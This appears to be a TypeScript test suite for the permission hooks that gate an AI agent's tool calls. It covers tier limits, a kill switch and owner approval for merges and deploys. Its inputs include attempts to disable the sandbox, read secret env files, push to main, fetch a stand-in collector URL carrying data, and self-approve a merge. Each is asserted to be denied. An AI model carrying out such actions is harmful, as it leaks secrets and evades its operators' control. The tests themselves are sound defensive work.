// Checked before any tool runs (hooks.ts): the tier, the kill switch, the
// shell and the files; and the brain's own actions that can't be undone are
// asked of the owner, never done. Text that only says "approved" changes
// nothing: the hook doesn't read it.

import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { HookCallback, HookJSONOutput } from "@anthropic-ai/claude-agent-sdk";
import type { BotClient } from "../src/bot.js";
import type { GitHub } from "../src/github.js";
import { hooksFor } from "../src/hooks.js";
import type { Tier } from "../src/policy.js";

function setup(tier: Tier, o: { stopped?: boolean; github?: GitHub | null; dev?: boolean } = {}) {
  const calls: { name: string; payload: Record<string, unknown> }[] = [];
  const bot: BotClient = {
    async call<T>(name: string, payload: Record<string, unknown>) {
      calls.push({ name, payload });
      return { ok: true, approval_id: "a1" } as T;
    },
  };
  const workdir = mkdtempSync(join(tmpdir(), "brain-h-"));
  const h = hooksFor({ tier, dev: o.dev ?? true, workdir, run: { id: "r1", asker: "u1", tier }, bot, github: o.github ?? null, stopped: () => !!o.stopped });
  const pre = h.PreToolUse![0]!.hooks[0]! as HookCallback;
  const ask = async (tool_name: string, tool_input: Record<string, unknown>) =>
    (await pre({ hook_event_name: "PreToolUse", tool_name, tool_input, tool_use_id: "t1", session_id: "s", transcript_path: "", cwd: workdir }, "t1", { signal: new AbortController().signal })) as HookJSONOutput & {
      hookSpecificOutput?: { permissionDecision?: string; permissionDecisionReason?: string };
    };
  return { ask, calls, workdir };
}

const denied = (r: { hookSpecificOutput?: { permissionDecision?: string } }) => r.hookSpecificOutput?.permissionDecision === "deny";

test("a member gets no shell and no files, whatever is asked", async () => {
  const { ask } = setup("member");
  assert.ok(denied(await ask("Bash", { command: "ls" })));
  assert.ok(denied(await ask("Read", { file_path: "README.md" })));
  assert.ok(denied(await ask("mcp__iklipse__push_branch", { branch: "x" })));
  assert.ok(!denied(await ask("mcp__iklipse__find", { table: "card" })));
});

test("the owner's shell and files: in the working copy, away from secrets", async () => {
  const { ask } = setup("owner");
  assert.ok(!denied(await ask("Bash", { command: "npm run test:bot" })));
  assert.ok(denied(await ask("Bash", { command: "git push origin main" })));
  assert.ok(denied(await ask("Bash", { command: "ls", dangerouslyDisableSandbox: true })));
  assert.ok(denied(await ask("Read", { file_path: "/etc/iklipse-brain/brain.env" })));
  assert.ok(denied(await ask("Read", { file_path: ".env" })));
  assert.ok(denied(await ask("WebFetch", { url: "https://collector.example.com/?d=1" })));
  assert.ok(!denied(await ask("Read", { file_path: "src/a.ts" })));
});

test("stopped: changes refused, reading goes", async () => {
  const { ask } = setup("owner", { stopped: true });
  assert.ok(denied(await ask("Edit", { file_path: "a.ts", old_string: "a", new_string: "b" })));
  assert.ok(denied(await ask("mcp__iklipse__message_team_member", {})));
  assert.ok(!denied(await ask("Read", { file_path: "a.ts" })));
});

test("merging: the owner is asked with the PR's exact head, and nothing is done", async () => {
  const fetches: string[] = [];
  const github: GitHub = {
    token: "t",
    repo: "o/r",
    workdir: "/w",
    deployDir: "/d",
    env: {},
    fetch: (async (url: string, init?: RequestInit) => {
      fetches.push(`${init?.method ?? "GET"} ${url}`);
      if (url.endsWith("/pulls/7")) return Response.json({ state: "open", base: { ref: "main" }, head: { sha: "a".repeat(40) }, title: "Fix reminders", html_url: "https://github.com/o/r/pull/7" });
      if (url.includes("/pulls/7/files")) return Response.json([{ filename: "reminders.ts", additions: 3, deletions: 1 }]);
      return Response.json({ check_runs: [{ name: "check", conclusion: "success" }] });
    }) as typeof fetch,
  };
  const { ask, calls } = setup("admin", { github });
  const r = await ask("mcp__iklipse__merge_pr", { number: 7, why: "the fix is reviewed", approved: true });
  assert.ok(denied(r));
  // An admin's own change: the code goes to them.
  assert.match(r.hookSpecificOutput!.permissionDecisionReason!, /Held for their OK/);
  const asked = calls.find((c) => c.name === "_approval")!;
  assert.deepEqual(asked.payload.input, { number: 7, head_sha: "a".repeat(40) });
  assert.match(String(asked.payload.detail), /reminders\.ts \+3 -1/);
  assert.ok(!fetches.some((f) => f.startsWith("PUT")), "never merged here");
});

test("changes to the system are private: in a group, an admin (or the owner) is refused before anyone is asked", async () => {
  for (const tier of ["admin", "owner"] as const) {
    const { ask, calls } = setup(tier, { dev: false, github: { token: "t", repo: "o/r", workdir: "/w", deployDir: "/d", env: {} } });
    for (const t of ["mcp__iklipse__deploy", "mcp__iklipse__merge_pr", "mcp__iklipse__push_branch", "mcp__iklipse__skill_add"]) {
      const r = await ask(t, { target: "functions", number: 7, branch: "x", content: "x" });
      assert.ok(denied(r), t);
      assert.match(r.hookSpecificOutput!.permissionDecisionReason!, /privately/);
    }
    assert.ok(denied(await ask("Bash", { command: "ls" })));
    assert.ok(!calls.some((c) => c.name === "_approval"));
  }
});
